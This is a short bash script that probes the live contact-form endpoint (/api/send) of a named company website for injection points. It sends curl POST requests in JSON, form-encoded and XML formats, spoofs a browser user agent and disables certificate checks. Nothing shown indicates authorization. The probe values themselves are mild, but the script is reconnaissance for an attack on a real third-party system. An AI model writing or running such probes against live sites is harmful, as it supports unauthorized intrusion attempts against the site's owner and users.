#!/bin/bash
# Shape discovery + injection on the LIVE /api/send sink
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36'
T='https://www.infinitycapital.bh'
post(){ curl -sk -A "$UA" -m 25 -X POST -H 'Content-Type: application/json' -d "$1" -o /tmp/resp.bin -w "HTTP=%{http_code} sz=%{size_download}" "$T/api/send"; echo " <- $2"; head -c 250 /tmp/resp.bin; echo; echo "---"; }

echo "=== A. JSON shapes ==="
post '{}' 'empty'
post '{"fname":"D10","lname":"Probe","telInput":"+97336000000","cname":"d10","msgTxt":"hello d10","check":"1"}' 'full form fields'
post '{"fname":"D10","email":"d10@x.com","message":"hi"}' 'alt names'
echo "=== B. form-encoded ==="
curl -sk -A "$UA" -m 25 -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'fname=D10&lname=Probe&telInput=%2B97336000000&cname=d10&msgTxt=hello&check=1' \
  -o /tmp/f.bin -w "HTTP=%{http_code} sz=%{size_download}\n" "$T/api/send"; head -c 250 /tmp/f.bin; echo
echo "=== C. content-type probing ==="
curl -sk -A "$UA" -m 25 -X POST -H 'Content-Type: application/xml' \
  --data '<?xml version="1.0"?><r><x>1</x></r>' -o /tmp/x.bin -w "xml HTTP=%{http_code} sz=%{size_download}\n" "$T/api/send"; head -c 200 /tmp/x.bin; echo
echo DONE
